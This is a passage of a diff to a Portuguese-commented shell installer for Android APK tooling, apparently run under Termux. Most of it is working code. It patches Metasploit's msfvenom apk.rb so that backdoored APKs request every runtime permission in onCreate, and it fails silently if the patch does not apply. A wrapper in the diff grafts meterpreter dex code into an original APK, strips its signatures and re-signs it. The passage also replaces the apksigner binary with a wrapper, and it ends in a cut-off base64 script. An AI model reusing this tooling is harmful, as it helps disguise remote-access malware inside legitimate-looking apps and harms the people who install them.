+pm << "      /(\\.method[^\\n]*\\bonCreate\\b[^\\n]*\\n(?:(?!\\.end method)[^\\n]*\\n)*?[ \\t]*invoke-super[^\\n]*\\bonCreate\\b[^\\n]*\\n)/\n"
+pm << "    ) do |blk|\n"
+pm << "      blk.include?('requestAllPerms') ? blk : blk + call_inj\n"
+pm << "    end\n"
+pm << "\n"
+pm << "    File.write(sfile, smali)\n"
+pm << "  rescue => _rp_err\n"
+pm << "    # silencioso — nao interrompe o msfvenom se o inject falhar\n"
+pm << "  end\n"
+
+# 1. Adiciona o metodo antes de def backdoor_apk
+if src.include?('  def backdoor_apk')
+  src = src.sub('  def backdoor_apk', pm.rstrip + "\n\n  def backdoor_apk")
+end
+
+# 2. Injeta a chamada antes do run_cmd de rebuild (apktool b)
+# Ancora: primeiro run_cmd contendo 'b' ou "b" como argumento (o rebuild step)
+call_line = "    _ae_inject_runtime_perms(tempdir, amanifest) # MSF_AE_RUNTIME_PERMS_V1\n"
+unless src.include?('MSF_AE_RUNTIME_PERMS_V1')
+  rebuilt = src.sub(/(?=[ \t]*run_cmd\(\[[^\]]*(?:'b'|"b")[^\]]*\])/) { call_line }
+  src = rebuilt
+end
+
+File.write(ARGV[0], src)
+RBFIXRP
+        grep -q 'MSF_AE_RUNTIME_PERMS_V1' "$apkrb" 2>/dev/null \
+            && _ok "apk.rb: runtime permissions configuradas (V1)" \
+            || _warn "Fix RUNTIME_PERMS_V1 nao aplicado (anchor run_cmd 'b' nao encontrado — apk.rb pode ter estrutura diferente)"
+    fi
 }
 
 # Garante que o banco de dados do Metasploit existe e esta rodando.
@@ -94902,8 +95337,8 @@ _backend_apktool() {
 
 # ── backend apkfull — kit completo de ferramentas APK ──────────────────────
 _backend_apkfull() {
-    # 1. apktool puro via pkg (msfvenom -x usa o binário diretamente)
-    _backend_apktool
+    # 1. APKEditor (tur-repo + fallback JAR) — suporte a APKs modernos
+    _backend_apkeditor
 
     # 2. apksigner + aapt + aapt2 + apkeep
     _info "Instalando apksigner, aapt, aapt2, apkeep..."
@@ -94922,7 +95357,10 @@ _backend_apkfull() {
         fi
     fi
 
-    # keystore EC P-256 (ms --apk, wrapper apktool)
+    # 2b. wrapper anti-idsig — remove .idsig gerado automaticamente após cada assinatura
+    _apksigner_wrap_idsig
+
+    # 3. Keystore EC P-256 (usada por ms --apk e web2apk)
     local _ks_dir="$HOME/.xpm/tools/apktool"
     local _ks="$_ks_dir/xpm-compat-test.keystore"
     mkdir -p "$_ks_dir"
@@ -94935,239 +95373,62 @@ _backend_apkfull() {
             || _warn "keytool falhou — rode xpm doctor pra tentar novamente"
     fi
 
-    # 3. APKEditor (tur-repo + fallback JAR)
-    _backend_apkeditor
+    # 4. apkinspect — análise estática de APK (sem pip)
+    _backend_apkinspect
 
-    # 4. Wrapper apktool→APKEditor em $PREFIX/bin/apktool (V2)
-    local _BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
-    local _ATMPDIR="${TMPDIR:-$_BPFX/tmp}"
-    local _wrapper="$_BPFX/bin/apktool"
-    local _rbin_apkeditor=""
-    if command -v apkeditor >/dev/null 2>&1; then
-        _rbin_apkeditor="$(PATH="$_BPFX/bin:/usr/bin:/bin" command -v apkeditor)"
-    elif [ -f "$HOME/.xpm/tools/apkeditor/apkeditor" ]; then
-        _rbin_apkeditor="$HOME/.xpm/tools/apkeditor/apkeditor"
+    # 5. web2apk — converte HTML/JS/CSS em APK real
+    _backend_web2apk
+}
+
+
+# ── apksigner anti-idsig wrapper ─────────────────────────────────────────────
+# Substitui o binário apksigner por um wrapper shell que:
+#   1. Delega tudo para apksigner.real (o binário/script original)
+#   2. Após a assinatura, remove qualquer <apk>.idsig gerado no processo
+# Idempotente: detecta pelo marcador ELLIOTOS_NO_IDSIG e não sobrescreve.
+# ─────────────────────────────────────────────────────────────────────────────
+_apksigner_wrap_idsig() {
+    local _BIN _REAL
+
+    command -v apksigner >/dev/null 2>&1 || {
+        _warn "apksigner não disponível — wrapper anti-idsig não instalado"
+        return 0
+    }
+
+    _BIN="$(command -v apksigner)"
+    _REAL="$(dirname "$_BIN")/apksigner.real"
+
+    # Idempotência: não sobrescreve se o wrapper já foi instalado
+    if grep -q "ELLIOTOS_NO_IDSIG" "$_BIN" 2>/dev/null; then
+        _ok "apksigner wrapper anti-idsig já instalado"
+        return 0
     fi
-    if [ -n "$_rbin_apkeditor" ]; then
-        cat > "$_wrapper" << 'APKWEOF'
+
+    # Preserva o binário/script real
+    cp "$_BIN" "$_REAL" 2>/dev/null || {
+        _warn "Não foi possível salvar apksigner.real — wrapper não instalado"
+        return 0
+    }
+    chmod +x "$_REAL"
+
+    # Escreve o wrapper no lugar do binário original
+    cat > "$_BIN" << 'APKSIGNER_NO_IDSIG_WRAPPER'
 #!/bin/sh
-# XPM_APKTOOL_AE_WRAPPER_V2 — apktool → APKEditor (ElliotOS)
-_AE="__AE_BIN__"
-_XPM_KS="$HOME/.xpm/tools/apktool/xpm-compat-test.keystore"
-_XPM_KS_ALIAS="xpm-compat-test"
-_XPM_KS_PASS="xpm-compat-test"
-
-export TMPDIR="${TMPDIR:-__ATMPDIR__}"
-mkdir -p "$TMPDIR" 2>/dev/null
-
-# OOM fix: heap adaptativo por contexto
-_mem_avail=$(awk '/MemAvailable/{print int($2/1024)}' /proc/meminfo 2>/dev/null)
-case "$_mem_avail" in ''|*[!0-9]*) _mem_avail=256 ;; esac
-_clean_java_opts=$(printf "%s" "${_JAVA_OPTIONS:-}" | sed 's/-Xmx[0-9]*[mMgGkK]*//g;s/-Xms[0-9]*[mMgGkK]*//g')
-if [ -n "${BUNDLE_GEMFILE:-}" ]; then
-    _xmx=$(( _mem_avail / 2 ))
-    [ "$_xmx" -lt 128 ] && _xmx=128
-    [ "$_xmx" -gt 512 ] && _xmx=512
-else
-    _xmx=$(( _mem_avail * 2 / 3 ))
-    [ "$_xmx" -lt 128 ] && _xmx=128
-    [ "$_xmx" -gt 768 ] && _xmx=768
-fi
-export _JAVA_OPTIONS="-Xms32m -Xmx${_xmx}m -XX:+UseSerialGC -Djava.io.tmpdir=$TMPDIR ${_clean_java_opts}"
-
-_ae_sign() {
-    _apk="$1"; [ -f "$_apk" ] || return 0
-    command -v apksigner >/dev/null 2>&1 || return 0
-    [ -f "$_XPM_KS" ] || return 0
-    _stem="${_apk%.apk}"; _aligned="${_stem}-za.apk"
-    if command -v zipalign >/dev/null 2>&1; then
-        zipalign -f -p 4 "$_apk" "$_aligned" 2>/dev/null \
-            && mv -f "$_aligned" "$_apk" || rm -f "$_aligned"
-    fi
-    apksigner sign --ks "$_XPM_KS" --ks-key-alias "$_XPM_KS_ALIAS" \
-        --ks-pass "pass:$_XPM_KS_PASS" --key-pass "pass:$_XPM_KS_PASS" \
-        "$_apk" 2>/dev/null && printf '[xpm] APK assinado: %s\n' "$_apk" >&2
+# ELLIOTOS_NO_IDSIG — wrapper ElliotOS para apksigner
+# Chama apksigner.real e remove o .idsig gerado após cada assinatura.
+_SELF="$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")"
+_REAL_BIN="$(dirname "$_SELF")/apksigner.real"
+"$_REAL_BIN" "$@"
+_rc=$?
+# apksigner gera <apk>.idsig para cada APK assinado — remove automaticamente
+for _a in "$@"; do
+    [ -f "${_a}.idsig" ] && rm -f "${_a}.idsig"
+done
+exit $_rc
+APKSIGNER_NO_IDSIG_WRAPPER
+    chmod +x "$_BIN"
+    _ok "apksigner wrapper anti-idsig instalado — .idsig removido automaticamente após assinar"
 }
-
-# Normaliza estrutura APKEditor → apktool apos decode
-# APKEditor: smali/classes/net/... e smali/classes2/com/...
-# apktool:   smali/net/...          e smali_classes2/com/...
-_ae_normalize_smali() {
-    _outdir="$1"
-    _smali="$_outdir/smali"
-    [ -d "$_smali/classes" ] || return 0
-    for _f in "$_smali/classes/"*; do
-        [ -e "$_f" ] || continue
-        mv -f "$_f" "$_smali/" 2>/dev/null
-    done
-    rmdir "$_smali/classes" 2>/dev/null
-    for _cd in "$_smali/classes"*/; do
-        [ -d "$_cd" ] || continue
-        _cn=$(basename "$_cd")
-        _tgt="$_outdir/smali_${_cn}"
-        mkdir -p "$_tgt"
-        for _f in "$_cd"*; do
-            [ -e "$_f" ] || continue
-            mv -f "$_f" "$_tgt/" 2>/dev/null
-        done
-        rmdir "$_cd" 2>/dev/null
-    done
-}
-
-case "${1:-}" in
-
-  -version|--version|-v)
-    printf '2.9.3\n'; exit 0 ;;
-
-  d|decode)
-    shift; _input=""; _output=""; _next_o=0; _force=""
-    for _a in "$@"; do
-      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
-      case "$_a" in
-        -o|--output) _next_o=1 ;; -f|--force) _force="-f" ;;
-        --only-main-classes|-r|--no-res|-s|--no-src|-q|--quiet) : ;;
-        -p|--frame-path|-t|--tag|-j|--jobs) _next_o=1 ;;
-        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
-      esac
-    done
-    [ -z "$_input" ] && { printf '[xpm] erro: apktool d — nenhum APK\n' >&2; exit 1; }
-    [ ! -f "$_input" ] && { printf '[xpm] erro: nao encontrado: %s\n' "$_input" >&2; exit 1; }
-    if [ -z "$_output" ]; then
-        _base=$(basename "$_input" .apk)
-        _output="$(dirname "$_input")/${_base}"
-    fi
-    set -- d -i "$_input" -o "$_output" -load-dex 1
-    [ -n "$_force" ] && set -- "$@" -f
-    "$_AE" "$@"; _rc=$?
-    if [ "$_rc" -ne 0 ]; then
-        printf '[xpm] decode APKEditor falhou (exit %d)\n' "$_rc" >&2
-        exit "$_rc"
-    fi
-    # Verifica se o AndroidManifest.xml foi criado (APKEditor pode ser morto por OOM)
-    if [ ! -f "$_output/AndroidManifest.xml" ]; then
-        printf '[xpm] decode: AndroidManifest.xml ausente em %s\n' "$_output" >&2
-        printf '[xpm] conteudo: %s\n' "$(ls "$_output/" 2>/dev/null | tr "\n" " ")" >&2
-        exit 1
-    fi
-    # Nao normaliza no contexto msfvenom: APKEditor b precisa de smali/classes/
-    [ -z "${BUNDLE_GEMFILE:-}" ] && _ae_normalize_smali "$_output"
-    exit 0 ;;
-
-  b|build)
-    shift; _input=""; _output=""; _next_o=0; _force=""
-    for _a in "$@"; do
-      [ "$_next_o" = 1 ] && { _output="$_a"; _next_o=0; continue; }
-      case "$_a" in
-        -o|--output) _next_o=1 ;; -f|--force-all) _force="-f" ;;
-        -p|--frame-path|-a|--aapt|-j|--jobs) _next_o=1 ;;
-        -*) : ;; *) [ -z "$_input" ] && _input="$_a" ;;
-      esac
-    done
-    [ -z "$_input" ] && { printf '[xpm] erro: apktool b — nenhuma pasta\n' >&2; exit 1; }
-    [ ! -d "$_input" ] && { printf '[xpm] erro: pasta nao encontrada: %s\n' "$_input" >&2; exit 1; }
-    [ -z "$_output" ] && { mkdir -p "$_input/dist"; _output="$_input/dist/$(basename "$_input").apk"; }
-
-    # Contexto msfvenom: patch cirurgico correto
-    # Base = APK original (preserva .so libs, assets, res, tudo intacto)
-    # Substitui APENAS: dex (com meterpreter) + AndroidManifest.xml (com permissoes)
-    # Extracao via "unzip -p" (pipe) — confiavel, sem glob, sem silencio em erros
-    # Motivo da falha anterior: unzip com glob "*" nao extraia dex silenciosamente
-    _orig_apk="$(dirname "$_input")/$(basename "$_input").apk"
-    if [ -n "${BUNDLE_GEMFILE:-}" ] && [ -f "$_orig_apk" ]; then
-        # Passo 1: APKEditor compila smali → dex (meterpreter incluido)
-        _ae_tmp="$(dirname "$_output")/_ae_$$"
-        # Remove atributos de build nao reconhecidos pelo framework android-23
-        # android:compileSdkVersion e compileSdkVersionCodename sao metadados
-        # adicionados pelo AGP 3.0+ — nao sao necessarios em runtime
-        sed -i 's/ android:compileSdkVersion="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
-        sed -i 's/ android:compileSdkVersionCodename="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
-        sed -i 's/ android:roundIcon="[^"]*"//g' "$_input/AndroidManifest.xml" 2>/dev/null || true
-        # Remove dirs v24+ — framework android-23 nao os suporta (patch cirurgico usa resources do APK original)
-        find "$_input/resources" -type d \( -name '*-v2[4-9]' -o -name '*-v[3-9][0-9]' \) \
-            -exec rm -rf {} + 2>/dev/null; true
-        "$_AE" b -i "$_input" -o "$_ae_tmp"; _rc=$?
-        # Fallback iterativo: trata erros de resource e de atributos do manifest
-        # sem esvaziar resources nem raspar o manifest inteiro
-        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
-            rm -f "$_ae_tmp"
-            _ae_err="$(dirname "$_output")/_ae_err_$$"
-            _retry=0
-            while [ "$_retry" -lt 20 ]; do
-                "$_AE" b -i "$_input" -o "$_ae_tmp" 2>"$_ae_err"; _rc=$?
-                [ "$_rc" -eq 0 ] && [ -f "$_ae_tmp" ] && break
-                # Extrai o arquivo que causou o erro
-                _fail_file=$(awk '/^at \//{gsub(/^at /,""); gsub(/ \[line.*/,""); print; exit}' "$_ae_err" 2>/dev/null)
-                # Extrai atributo desconhecido (android-23 nao conhece roundIcon, etc.)
-                _fail_attr=$(grep "Unknown attribute name" "$_ae_err" 2>/dev/null | sed "s/.*Unknown attribute name '//;s/'.*//" | head -1)
-                case "$_fail_file" in
-                    "$_input"/resources/*)
-                        # Arquivo de resource falhou — remove e tenta de novo
-                        rm -f "$_fail_file" 2>/dev/null ;;
-                    "$_input"/AndroidManifest.xml)
-                        # Atributo desconhecido no manifest — remove só esse atributo
-                        if [ -n "$_fail_attr" ]; then
-                            sed -i "s/ ${_fail_attr}=\"[^\"]*\"//g" "$_input/AndroidManifest.xml" 2>/dev/null
-                        else
-                            break
-                        fi ;;
-                    *) break ;;
-                esac
-                _retry=$((_retry + 1))
-            done
-            rm -f "$_ae_err"
-        fi
-        if [ "$_rc" -ne 0 ] || [ ! -f "$_ae_tmp" ]; then
-            rm -f "$_ae_tmp"
-            printf '[xpm] build APKEditor falhou (exit %d)\n' "$_rc" >&2
-            exit "${_rc:-1}"
-        fi
-        # Passo 2: extrai dex + manifest do build — arquivo por arquivo (sem glob)
-        _ptmp="$(dirname "$_output")/_patch_$$"
-        mkdir -p "$_ptmp"
-        # Lista os dex no build e extrai cada um individualmente via pipe
-        for _dn in $(unzip -l "$_ae_tmp" 2>/dev/null | awk '/\.dex$/{print $NF}'); do
-            unzip -p "$_ae_tmp" "$_dn" > "$_ptmp/$_dn" 2>/dev/null
-        done
-        unzip -p "$_ae_tmp" AndroidManifest.xml > "$_ptmp/AndroidManifest.xml" 2>/dev/null
-        # Passo 3: copia APK original como base (preserva lib, assets, res, tudo)
-        cp "$_orig_apk" "$_output"
-        # Passo 4: remove entradas antigas e injeta as modificadas
-        cd "$_ptmp"
-        for _f in *.dex AndroidManifest.xml; do
-            [ -f "$_f" ] || continue
-            zip -d "$_output" "$_f" 2>/dev/null || true
-            zip "$_output" "$_f" 2>/dev/null
-        done
-        # Passo 5: remove assinatura velha (apk.rb re-assina depois)
-        zip -d "$_output" "META-INF/*" 2>/dev/null || true
-        cd -
-        rm -rf "$_ptmp" "$_ae_tmp"
-    else
-        # Uso manual ou original nao encontrado: build completo normal
-        "$_AE" b -i "$_input" -o "$_output"; _rc=$?
-        if [ "$_rc" -ne 0 ]; then
-            printf '[xpm] build falhou (exit %d) — use -f para forcar\n' "$_rc" >&2; exit "$_rc"
-        fi
-    fi
-    _ae_sign "$_output" ;;
-
-  if|install-framework|empty-framework-dir|publicize-framework)
-    printf '[xpm] aviso: "%s" nao suportado — ignorado\n' "$1" >&2; exit 0 ;;
-
-  *) exec "$_AE" "$@" ;;
-
-esac
-APKWEOF
-        sed -i "s|__AE_BIN__|${_rbin_apkeditor}|g" "$_wrapper"
-        sed -i "s|__ATMPDIR__|${_ATMPDIR}|g" "$_wrapper"
-        chmod +x "$_wrapper"
-        rm -f "$HOME/.local/bin/apktool" 2>/dev/null || true
-        _ok "wrapper apktool→APKEditor V2 instalado ($_wrapper)"
-    else
-        _warn "apkeditor nao encontrado — wrapper nao instalado"
-    fi
-}
-
 
 
 # ── backend apkeditor — APKEditor (decode/rebuild moderno para uso manual) ──
@@ -95319,6 +95580,8 @@ _dispatch_install() {
         apkfull)   _backend_apkfull ;;
         apkeditor) _backend_apkeditor ;;
         web2apk)   _backend_web2apk ;;
+        apkinspect) _backend_apkinspect ;;
+        wordmagic)  _backend_wordmagic ;;
         *)      _die "Backend desconhecido: $origin" ;;
     esac
 }
@@ -95371,7 +95634,7 @@ print('  android.jar salvo (' + jar_entry + ')')
   python3 - "$W2A_BIN" << 'PYEOF'
 import sys, os, stat
 path = sys.argv[1]
-script_b64 = 'IyEvdXNyL2Jpbi9lbnYgYmFzaAojIHdlYjJhcGsgLS0gRWxsaW90T1MgSFRNTC9DU1MvSlMgLT4gQVBLClZFUlNJT049JzEuMC4wJwpQUkVGSVg9IiR7UFJFRklYOi0vZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyfSIKVzJBX0hPTUU9IiRIT01FLy54cG0vd2ViMmFwayIKVzJBX0pBUj0iJFcyQV9IT01FL2FuZHJvaWQuamFyIgpXMkFfS1M9IiRIT01FLy54cG0vdG9vbHMvYXBrdG9vbC94cG0tY29tcGF0LXRlc3Qua2V5c3RvcmUiClsgLWYgIiRXMkFfS1MiIF0gfHwgVzJBX0tTPSIkVzJBX0hPTUUvd2ViMmFway5rZXlzdG9yZSIKX29rKCkgICB7IHByaW50ZiAnXDAzM1sxOzMybSAgb2sgJXNcMDMzWzBtXG4nICAiJDEiOyB9Cl9pbmZvKCkgeyBwcmludGYgJ1wwMzNbMTszNm0gIC0+ICVzXDAzM1swbVxuJyAgIiQxIjsgfQpfd2FybigpIHsgcHJpbnRmICdcMDMzWzE7MzNtICAhICAlc1wwMzNbMG1cbicgICIkMSI7IH0KX2VycigpICB7IHByaW50ZiAnXDAzM1sxOzMxbSAgWCAgJXNcMDMzWzBtXG4nICIkMSIgPiYyOyBleGl0IDE7IH0KX2hlYWQoKSB7IHByaW50ZiAnXG5cMDMzWzE7MzVtICA9PSAlcyA9PVwwMzNbMG1cbicgIiQxIjsgfQpfZGltKCkgIHsgcHJpbnRmICdcMDMzWzA7OTBtICAlc1wwMzNbMG1cbicgIiQxIjsgfQpfcGVybV9yZXNvbHZlKCkgewogIGxvY2FsIHAKICBmb3IgcCBpbiAkKHByaW50ZiAnJXMnICIkMSIgfCB0ciAnLCcgJyAnKTsgZG8KICAgIGNhc2UgIiQocHJpbnRmICclcycgIiRwIiB8IHRyICdBLVonICdhLXonIHwgdHIgLWQgJyAnKSIgaW4KICAgICAgaW50ZXJuZXR8bmV0fG5ldHdvcmspICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5JTlRFUk5FVCcgOzsKICAgICAgY2FtZXJhfHdlYmNhbXxjYW0pICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5DQU1FUkEnIDs7CiAgICAgIG1pY3xtaWNyb3Bob25lfGF1ZGlvfHJlY29yZCkgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ09SRF9BVURJTycgOzsKICAgICAgc3RvcmFnZXxhcmNoaXZlc3xmaWxlc3xzZGNhcmQpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfRVhURVJOQUxfU1RPUkFHRScKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTUFOQUdFX0VYVEVSTkFMX1NUT1JBR0UnIDs7CiAgICAgIGxvY2F0aW9ufGdwc3xnZW8pCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkFDQ0VTU19GSU5FX0xPQ0FUSU9OJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5BQ0NFU1NfQ09BUlNFX0xPQ0FUSU9OJyA7OwogICAgICB2aWJyYXRlfHZpYnJhdGlvbikgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlZJQlJBVEUnIDs7CiAgICAgIGJsdWV0b290aHxidCkKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5CTFVFVE9PVEhfQ09OTkVDVCcKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQkxVRVRPT1RIX1NDQU4nIDs7CiAgICAgIG5mYykgICAgICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uTkZDJyA7OwogICAgICBjb250YWN0cykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUkVBRF9DT05UQUNUUycKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uV1JJVEVfQ09OVEFDVFMnIDs7CiAgICAgIHBob25lfGNhbGwpCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkNBTExfUEhPTkUnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQURfUEhPTkVfU1RBVEUnIDs7CiAgICAgIHNtcykKICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uU0VORF9TTVMnCiAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLlJFQ0VJVkVfU01TJwogICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5SRUFEX1NNUycgOzsKICAgICAgd2FrZXx3YWtlbG9jaykgICAgICAgICAgIGVjaG8gJ2FuZHJvaWQucGVybWlzc2lvbi5XQUtFX0xPQ0snIDs7CiAgICAgIG5vdGlmaWNhdGlvbnN8bm90aWYpICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uUE9TVF9OT1RJRklDQVRJT05TJyA7OwogICAgICBmbGFzaGxpZ2h0fHRvcmNoKSAgICAgICAgZWNobyAnYW5kcm9pZC5wZXJtaXNzaW9uLkZMQVNITElHSFQnIDs7CiAgICAgIHNlbnNvcnMpICAgICAgICAgICAgICAgICBlY2hvICdhbmRyb2lkLnBlcm1pc3Npb24uQk9EWV9TRU5TT1JTJyA7OwogICAgICAqKSAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiJHAiIDs7CiAgICBlc2FjCiAgZG9uZQp9Cl9nZW5faWNvbigpIHsKICBsb2NhbCBkc3Q9IiQxIiBzej0iJHsyOi0xOTJ9IgogIHB5dGhvbjMgLWMgIgppbXBvcnQgc3RydWN0LHpsaWIKZHN0LHN6PSckZHN0JyxpbnQoJyRzeicgaWYgJyRzeicgZWxzZSAnMTkyJykKcixnLGI9MjYsMTE1LDIzMgpkZWYgY2h1bmsobixkKToKIGM9emxpYi5jcmMzMihuK2QpJjB4ZmZmZmZmZmYKIHJldHVybiBzdHJ1Y3QucGFjaygnPkknLGxlbihkKSkrbitkK3N0cnVjdC5wYWNrKCc+SScsYykKcmF3PWInJwpmb3IgXyBpbiByYW5nZShzeik6IHJhdys9YidcXHgwMCcrYnl0ZXMoW3IsZyxiLDI1NV0qc3opCnBuZz1iJ1xceDg5UE5HXFxyXFxuXFx4MWFcXG4nK2NodW5rKGInSUhEUicsc3RydWN0LnBhY2soJz5JSUJCQkJCJyxzeixzeiw4LDYsMCwwLDApKStjaHVuayhiJ0lEQVQnLHpsaWIuY29tcHJlc3MocmF3LDYpKStjaHVuayhiJ0lFTkQnLGInJykKb3Blbihkc3QsJ3diJykud3JpdGUocG5nKQoiIDI+L2Rldi9udWxsCn0KX3Jlc2l6ZV9pY29uKCkgewogIGxvY2FsIHNyYz0iJDEiIGRzdD0iJDIiIHN6PSIkMyIKICBta2RpciAtcCAiJChkaXJuYW1lICIkZHN0IikiCiAgcHl0aG9uMyAtYyAiCmltcG9ydCBzeXMsc2h1dGlsCnRyeToKIGZyb20gUElMIGltcG9ydCBJbWFnZQogSW1hZ2Uub3BlbignJHNyYycpLmNvbnZlcnQoJ1JHQkEnKS5yZXNpemUoKGludCgnJHN6JyksaW50KCckc3onKSksSW1hZ2UuTEFOQ1pPUykuc2F2ZSgnJGRzdCcpCmV4Y2VwdDogc2h1dGlsLmNvcHkoJyRzcmMnLCckZHN0JykKIiAyPi9kZXYvbnVsbCB8fCBjcCAiJHNyYyIgIiRkc3QiCn0KX2Vuc3VyZV9rZXlzdG9yZSgpIHsKICBbIC1mICIkVzJBX0tTIiBdICYmIHJldHVybgogIF9pbmZvICdHZXJhbmRvIGtleXN0b3JlLi4uJwogIG1rZGlyIC1wICIkKGRpcm5hbWUgIiRXMkFfS1MiKSIKICBrZXl0b29sIC1nZW5rZXlwYWlyIC12IC1rZXlzdG9yZSAiJFcyQV9LUyIgLWFsaWFzIHdlYjJhcGsgLWtleWFsZyBFQyAta2V5c2l6ZSAyNTYgLXZhbGlkaXR5IDEwMDAwIC1zdG9yZXBhc3Mgd2ViMmFway1rZXkgLWtleXBhc3Mgd2ViMmFway1rZXkgLWRuYW1lICdDTj13ZWIyYXBrLCBPPUVsbGlvdE9TLCBDPUJSJyAyPi9kZXYvbnVsbCAmJiBfb2sgJ0tleXN0b3JlIGNyaWFkYScKfQpfY21kX2NoZWNrKCkgewogIF9oZWFkICd3ZWIyYXBrIGNoZWNrJwogIGxvY2FsIG9rPTEKICBmb3IgY21kIGluIGFhcHQyIGVjaiBkeCBhcGtzaWduZXIgemlwYWxpZ24gcHl0aG9uMyBrZXl0b29sOyBkbwogICAgY29tbWFuZCAtdiAiJGNtZCIgPi9kZXYvbnVsbCAyPiYxICYmIF9vayAiJGNtZCIgfHwgeyBfd2FybiAiJGNtZCBuYW8gZW5jb250cmFkbyI7IG9rPTA7IH0KICBkb25lCiAgWyAtZiAiJFcyQV9KQVIiIF0gJiYgX29rICJhbmRyb2lkLmphciAtPiAkVzJBX0pBUiIgfHwgeyBfd2FybiAnYW5kcm9pZC5qYXIgYXVzZW50ZSAtLSB4cG0gaW5zdGFsbCB3ZWIyYXBrJzsgb2s9MDsgfQogIFsgIiRvayIgLWVxIDEgXSAmJiBwcmludGYgJ1xuXDAzM1sxOzMybSAgVHVkbyBwcm9udG8uXDAzM1swbVxuXG4nIHx8IHByaW50ZiAnXG5cMDMzWzE7MzNtICBJbnN0YWxlIG9zIGl0ZW5zIGFjaW1hLlwwMzNbMG1cblxuJwp9Cl9jbWRfaGVscCgpIHsKICBwcmludGYgJ1xuXDAzM1sxOzM1bSAgd2ViMmFwayAtLSBFbGxpb3RPUyBIVE1ML0NTUy9KUyAtPiBBUEtcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybVVzbzpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgd2ViMmFwayBidWlsZCA8ZGlyPiBbb3Bjb2VzXVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgYnVpbGQgLS11cmwgPGh0dHBzOi8vLi4uPiBbb3Bjb2VzXVxuJwogIHByaW50ZiAnICAgIHdlYjJhcGsgY2hlY2sgfCBoZWxwXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybU9wY29lcyBkZSBidWlsZDpcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgLS1uYW1lIFwiTm9tZVwiICAgICAgICAgIE5vbWUgZXhpYmlkb1xuJwogIHByaW50ZiAnICAgIC0tcGtnbmFtZSBjb20ucGtnLmlkICAgUGFja2FnZSBJRFxuJwogIHByaW50ZiAnICAgIC0taWNvbiAvcGF0aC9pY29uLnBuZyAgSWNvbmUgUE5HIGxhdW5jaGVyXG4nCiAgcHJpbnRmICcgICAgLS1vdXQgL3BhdGgvYXBwLmFwayAgICBTYWlkYVxuJwogIHByaW50ZiAnICAgIC0tcGVybSBjYW0sbWljLC4uLiAgICAgUGVybWlzc29lcyBwb3IgdmlyZ3VsYVxuJwogIHByaW50ZiAnICAgIC0tdmVyc2lvbiBcIjEuMFwiICAgICAgICBWZXJzaW9uIG5hbWVcbicKICBwcmludGYgJyAgICAtLXZlcnNpb25jb2RlIE4gICAgICAgIFZlcnNpb24gY29kZVxuJwogIHByaW50ZiAnICAgIC0tbWluLXNkayBOICAgICAgICAgICAgTWluIFNESyAocGFkcmFvIDIxKVxuJwogIHByaW50ZiAnICAgIC0tdGFyZ2V0LXNkayBOICAgICAgICAgVGFyZ2V0IFNESyAocGFkcmFvIDMzKVxuJwogIHByaW50ZiAnICAgIC0tb3JpZW50YXRpb24gcG9ydHJhaXR8bGFuZHNjYXBlfGF1dG9cbicKICBwcmludGYgJyAgICAtLWZ1bGxzY3JlZW4gICAgICAgICAgIEVzY29uZGUgc3RhdHVzIGJhclxuJwogIHByaW50ZiAnICAgIC0tdGhlbWUgZGFya3xsaWdodHx0cmFuc3BhcmVudFxuJwogIHByaW50ZiAnICAgIC0tdXJsIGh0dHBzOi8vLi4uICAgICAgQ2FycmVnYSBVUkwgcmVtb3RhXG4nCiAgcHJpbnRmICcgICAgLS1uby1pbnRlcm5ldCAgICAgICAgICBTZW0gSU5URVJORVQgYXV0b21hdGljYVxuXG4nCiAgcHJpbnRmICcgIFwwMzNbMTszMm1QZXJtaXNzb2VzOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtaW50ZXJuZXQgY2FtZXJhIG1pYyBzdG9yYWdlIGxvY2F0aW9uIHZpYnJhdGUgYmx1ZXRvb3RoIG5mYyBjb250YWN0cyBwaG9uZSBzbXMgd2FrZSBub3RpZmljYXRpb25zIGZsYXNobGlnaHQgc2Vuc29yc1wwMzNbMG1cblxuJ